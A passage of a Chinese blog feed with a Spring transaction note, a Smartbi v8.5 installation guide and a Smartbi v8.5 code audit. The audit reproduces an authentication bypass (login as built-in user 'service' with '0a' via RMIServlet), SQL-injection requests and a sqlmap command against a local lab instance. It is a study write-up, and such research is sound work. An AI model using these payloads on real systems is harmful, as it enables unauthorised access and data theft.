class="code"><pre><code class="hljs java"><span class="hljs-comment">//声明式事务注解</span><br><span class="hljs-comment">//propagation = Propagation.REQUIRED：当前方法有事务则加入该事务；如果当前方法没有事务，则新建一个事务。</span><br><span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span><br><span class="hljs-comment">//业务方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> aMethod &#123;<br>  <span class="hljs-comment">//do something</span><br>  <span class="hljs-comment">//创建两个对象 b 和 c</span><br>  <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>  <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>  <span class="hljs-comment">//调用 B 和 C 的方法</span><br>  b.bMethod();<br>  c.cMethod();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>spring</strong> <strong>7种事务传播行为</strong><strong>：</strong></p><ul><li>propagation_requierd：如果当前没有事务，就新建一个事务，如果已存在一个事务中，加入到这个事务中，这是最常见的选择。</li><li>propagation_supports：支持当前事务，如果没有当前事务，就以非事务方法执行。</li><li>propagation_mandatory：使用当前事务，如果没有当前事务，就抛出异常。</li><li>propagation_required_new：新建事务，如果当前存在事务，把当前事务挂起。</li><li>propagation_not_supported：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。</li><li>propagation_never：以非事务方式执行操作，如果当前事务存在则抛出异常。</li><li>propagation_nested：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则执行与propagation_required类似的操作</li></ul><p>Spring 默认的事务传播行为是 PROPAGATION_REQUIRED，它适合于绝大多数的情况。</p><p><strong>使用Spring管理事务，注意头文件的约束导入 : tx</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;<br><br>http://www.springframework.org/schema/tx<br>http://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 环境搭建</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-环境搭建"><a href="#Smartbi-v8-5-环境搭建" class="headerlink" title="Smartbi v8.5 环境搭建"></a>Smartbi v8.5 环境搭建</h1><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>通过网盘分享的文件：Smartbi Insight Edition-2018-11-22.zip<br>链接: <a href="https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ">https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ</a> 提取码: wan4 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207593.png" alt="20250730142614982"></p><p>用户名和公司名称随意</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207797.png" alt="20250730142606223"></p><p>更改安装目录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207535.png" alt="20250730142705002"></p><p><strong>此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207934.png" alt="20250730142800593"></p><p>不选择“注册为Windows服务”，内存大小默认即可</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211381.png" alt="20250730142851342"></p><p>登录首页的密码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211551.png" alt="20250730142859437"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211744.png" alt="20250730142905276"></p><h2 id="二、license获取"><a href="#二、license获取" class="headerlink" title="二、license获取"></a>二、license获取</h2><p>官网地址：<a href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a></p><p>license申请地址：<a href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a></p><p>这里第一次进入需要注册\登录：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211274.png" alt="20250730201318600"></p><p>之后便可以申请了，邮箱要填正确，之后会将 license 发到邮箱里</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072212883.png" alt="20250806200815728"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072213347.png" alt="image-20250807221345227"></p><p>选择个人版</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214816.png" alt="20250730201536174"></p><p>之后在邮箱里可以看到发的：Smartbi-License.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214979.png" alt="20250730201709835"></p><h3 id="获取-licence-后，将其放置在-E-Smartbi-Tomcat-bin文件夹下"><a href="#获取-licence-后，将其放置在-E-Smartbi-Tomcat-bin文件夹下" class="headerlink" title="获取 licence 后，将其放置在 E:\Smartbi\Tomcat\bin文件夹下"></a>获取 licence 后，将其放置在 <code>E:\Smartbi\Tomcat\bin</code>文件夹下</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214848.png" alt="20250730203434407"></p><h2 id="三、创建数据库"><a href="#三、创建数据库" class="headerlink" title="三、创建数据库"></a>三、创建数据库</h2><p>首先连接 <code>Smartbi</code> ：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215810.png" alt="20250730202151890"></p><p>创建<code>Smartbi</code> 数据库：</p><p><strong>第一步连接好之后，是没有 smartbi 数据库的，需要自己创建</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215211.png" alt="20250730202209089"></p><p>下面是 MySQL 的配置：</p><p><code>database-name</code> 在选择安装“演示数据库”时是：<code>smartbidemo</code>；咋们没有选择，所以默认是：<code>smartbi</code>。</p><p>E:\Smartbi\Tomcat\bin\smartbi-config.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215236.png" alt="20250730202402962"></p><h2 id="四、解决浏览器版本误判"><a href="#四、解决浏览器版本误判" class="headerlink" title="四、解决浏览器版本误判"></a>四、解决浏览器版本误判</h2><p>这一步可以看下面问题中的 <code>1、</code></p><h2 id="五、启动程序"><a href="#五、启动程序" class="headerlink" title="五、启动程序"></a>五、启动程序</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd</p><p>运行 startup.cmd ，启动服务器</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>系统开始菜单中找到 Smartbi 的安装目录，单击启动Smartbi服务</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215033.png" alt="20250730203101194"></p><p>没有报错的话，就是启动成功了，</p><p><strong>若到这一步服务启动有错，重启电脑！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215464.png" alt="20250730203306884"></p><h2 id="六、配置程序"><a href="#六、配置程序" class="headerlink" title="六、配置程序"></a>六、配置程序</h2><p>访问Smartbi:</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216056.png" alt="20250730203519660"></p><p>首次访问，需输入密码，这里的密码随意，我的是 <code>admin</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216206.png" alt="20250730203618192"></p><p>接下来的配置按照图中所示即可：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216156.png" alt="20250730204159549"></p><h2 id="七、进入主页"><a href="#七、进入主页" class="headerlink" title="七、进入主页"></a>七、进入主页</h2><p>重启服务后，再次点击<code>访问Smartbi</code>，会进入下方页面：</p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a></p><p>首次访问登录页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216556.png" alt="20250730204745953"></p><p>此处的旧密码是<code>manager</code>，之后自行修改一个新密码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217262.png" alt="20250730204612002"></p><p>这是之后访问登录页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217160.png" alt="20250730204403222"></p><p>登录系统：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217230.png" alt="20250730204932051"></p><p>至此，Smartbi v8.5 环境搭建完成。</p><h1 id="搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）："><a href="#搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）：" class="headerlink" title="搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）："></a>搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）：</h1><h2 id="1、浏览器版本被错误检测"><a href="#1、浏览器版本被错误检测" class="headerlink" title="1、浏览器版本被错误检测"></a>1、浏览器版本被错误检测</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217317.png" alt="20250730194311903"></p><p>参考：<a href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a></p><h3 id="方法一：从“管理加载项”窗口打开-Internet-Explorer"><a href="#方法一：从“管理加载项”窗口打开-Internet-Explorer" class="headerlink" title="方法一：从“管理加载项”窗口打开 Internet Explorer"></a>方法一：从“管理加载项”窗口打开 Internet Explorer</h3><p>用过 IE浏览器的人应该知道，IE中是可以通过 Internet属性 窗口，对浏览器进行功能设置的。</p><p>虽然 Win11默认找不到 IE的入口，但是 Internet属性 程序依然可以正常运行，我们可以点击其中的 管理加载项 功能，打开 IE 浏览器。</p><p>步骤是：</p><ol><li>首先，按 <code>Win + R</code> 打开运行窗口</li><li>接下来，在运行命令框中输入 <code>inetcpl.cpl</code></li><li>单击 <code>确定</code> 进入 Internet 属性窗口</li><li>选择 <code>程序</code> 选项卡，点击 <code>管理加载项</code> 按钮<ol><li>然后，点击窗口底部 <code>了解有关工具栏和扩展的详细信息</code></li><li>铛铛铛，你要的 IE浏览器出现啦~</li></ol></li></ol><h3 id="方法二：注释掉判断语句"><a href="#方法二：注释掉判断语句" class="headerlink" title="方法二：注释掉判断语句"></a>方法二：注释掉判断语句</h3><p>进入 E:\Smartbi\Tomcat\webapps\smartbi\vision</p><p>找到文件 config.jsp</p><p>将判断部分注释掉</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219561.png" alt="20250729143004181"></p><h2 id="2、报表数量超过限制"><a href="#2、报表数量超过限制" class="headerlink" title="2、报表数量超过限制"></a>2、报表数量超过限制</h2><p>07-29 20:27:27 ERROR activate(smartbi.framework.Framework:85) - 报表数量超过限制<br>报表数量超过限制:ReportCount:452&gt;20</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219949.png" alt="20250729211037212"></p><p><strong>这个问题是由于安装时选择了安装<code>演示数据库</code> ，不安装即可。</strong></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 代码审计</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-代码审计"><a href="#Smartbi-v8-5-代码审计" class="headerlink" title="Smartbi v8.5 代码审计"></a>Smartbi v8.5 代码审计</h1><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">E:.<br>├─Infobright用于分析型数据存储<br>├─jdkJava 开发环境<br>├─MySQL数据库服务<br>├─SmartbiUnionServerSmartbi 的 Union Server 模块（Presto 引擎相关）<br>├─smartbixmlaSmartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信<br>└─TomcatSmartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展<br>    ├─bin包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志<br>    |<span class="hljs-string">   </span>|<span class="hljs-string">  exts-smartbi扩展模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  Index-smartbi搜索索引</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  mlogs-smartbi模块级别日志</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  SmartbiX-ExtractData 数据导出模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  smartbi_repoBackup仓库备份</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span><br><span class="hljs-string">    ├─conf配置文件所在</span><br><span class="hljs-string">   </span>|<span class="hljs-string">│  catalina.policy</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  catalina.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  context.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  logging.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  server.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  tomcat-users.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  web.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│</span><br><span class="hljs-string"></span>|<span class="hljs-string">└─Catalina</span><br><span class="hljs-string">    </span>|<span class="hljs-string">└─localhost</span><br><span class="hljs-string">    ├─lib包含Tomcat运行所需的JAR库文件</span><br><span class="hljs-string">    ├─logs</span><br><span class="hljs-string">    ├─temp</span><br><span class="hljs-string">    ├─webapps实际部署的Web应用程序</span><br><span class="hljs-string">    ├─work Tomcat 运行时自动生成的 JSP 编译缓存</span><br></code></pre></td></tr></table></figure><p>在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助</p><blockquote><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p></blockquote><h1 id="历史漏洞："><a href="#历史漏洞：" class="headerlink" title="历史漏洞："></a>历史漏洞：</h1><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><blockquote><p>Smartbi 身份认证绕过漏洞</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p></blockquote><p>网上的 身份认证&#x2F;内置用户登陆 绕过的代码和v8.5版本的有一些区别，不过还是能跟踪到代码漏洞点</p><p>1、代码分析</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p><p>首先找到 CheckIsLoggedFilter.class 文件的 needToCheck() 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png" alt="20250801173411982"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needToCheck</span><span class="hljs-params">(String className, String methodName)</span> &#123;<br>    <span class="hljs-comment">//判断 className 非空且不是 BIConfigService （ BIConfigService 是完全信任的服务类，不需要任何登录校验）</span><br>    <span class="hljs-keyword">if</span> (!StringUtil.isNullOrEmpty(className) &amp;&amp; !className.equals(<span class="hljs-string">&quot;BIConfigService&quot;</span>)) &#123;<br>        <span class="hljs-comment">//如果调用的是 UserService 中的方法，即 methodName 属于&#123;&quot;login&quot;, &quot;loginFor&quot;, &quot;clickLogin&quot;, &quot;loginFromDB&quot;, &quot;logout&quot;, &quot;isLogged&quot;, &quot;isLoginAs&quot;, &quot;checkVersion&quot;, &quot;hasLicense&quot;&#125;</span><br>        <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;UserService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;loginFor&quot;</span>, <span class="hljs-string">&quot;clickLogin&quot;</span>, <span class="hljs-string">&quot;loginFromDB&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;isLogged&quot;</span>, <span class="hljs-string">&quot;isLoginAs&quot;</span>, <span class="hljs-string">&quot;checkVersion&quot;</span>, <span class="hljs-string">&quot;hasLicense&quot;</span>&#125;)) &#123;<br>            <span class="hljs-comment">//则不需要登录验证</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>接下来找找 CheckIsLoggedFilter 是在哪里利用的？</p><p> 找到在web.xml中有我们需要的路由 <code>/vision/RMIServlet</code></p><blockquote><p>看到的文章中都是先知道了 RMIServlet 这个路由，然后找到 CheckIsLoggedFilter </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png" alt="20250801175223846"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png" alt="20250801174751116"></p><p>尝试访问 <a href="http://localhost:18080/smartbi/vision/RMIServlet">http://localhost:18080/smartbi/vision/RMIServlet</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png" alt="20250801174912101"></p><p>POC：</p><p>主要结构：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;service&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>内置用户（service），口令为0a；public、system可能不存在。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png" alt="20250806083335304"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png" alt="20250801175555800"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png" alt="20250801175813702"></p><p>使用hackbar也可以，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png" alt="20250801180133641"></p><p>之后访问 <a href="http://localhost:18080/smartbi/vision/">http://localhost:18080/smartbi/vision/</a></p><p>发现已经进入后台</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png" alt="20250801180228087"></p><h2 id="SQL注入（FileResource）"><a href="#SQL注入（FileResource）" class="headerlink" title="SQL注入（FileResource）"></a>SQL注入（FileResource）</h2><p>FileResource 是用于处理文件的 Servlet</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png" alt="20250802132757662"></p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\fileresource\FileResourceServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png" alt="20250802132840122"></p><p>分析代码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png" alt="20250802133545296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//从请求中获取 resID</span><br>    resID = request.getParameter(<span class="hljs-string">&quot;resId&quot;</span>);<br>    <span class="hljs-comment">//初始化 headerType 为 inline，inline 表示浏览器尝试直接在页面中打开文件（比如 PDF、图片）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">headerType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inline&quot;</span>;<br>    <span class="hljs-comment">//判断操作类型 opType 是 &quot;OPEN&quot; 还是 &quot;DOWNLOAD&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPEN&quot;</span>.equals(opType)) &#123;<br>        actionType = OperationType.FILE_RESOURCE_OPEN;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        actionType = OperationType.FILE_RESOURCE_DOWNLOAD;<br>        headerType = <span class="hljs-string">&quot;attachment&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//使用 Connection 对象创建 Statement，用于执行 SQL </span><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-comment">//执行 SQL 查询，从 t_fileresource 表中查找指定 resID 的资源文件信息</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stat.executeQuery(<span class="hljs-string">&quot;select c_content,c_name,c_alias,c_type from t_fileresource where c_id = &#x27;&quot;</span> + resID + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>没有对 resID 参数进行过滤直接使用 executeQuery() 拼接执行sql语句，造成sql注入</strong></p><p>构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/FileResource?resId=<span class="hljs-number">1</span>&amp;opType=DOWNLOAD<br></code></pre></td></tr></table></figure><p>可以sqlmap跑一下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&amp;opType=DOWNLOAD&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png" alt="20250802140622564"></p><h2 id="SQL注入（RMIServlet）"><a href="#SQL注入（RMIServlet）" class="headerlink" title="SQL注入（RMIServlet）"></a>SQL注入（RMIServlet）</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\repository\FileResourceDAO.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png" alt="20250805165508359"></p><p>getFileResource方法接收参数 id ，直接拼接SQl语句查询 t_fileresource 表，没有对 id 进行过滤或者其他的安全措施，存在SQL注入风险</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png" alt="20250805181321541"></p><p>getFileResource方法在URLLinkService中调用：</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\urllink\URLLinkService.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png" alt="20250805181341517"></p><p><strong>漏洞复现：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-sqf">Content-<span class="hljs-built_in">Type</span>: application/x-www-form-urlencoded</span><br><span class="language-sqf"></span><br><span class="language-sqf"><span class="hljs-built_in">className</span>=UrlLinkService&amp;methodName=getFileResource&amp;<span class="hljs-built_in">params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span 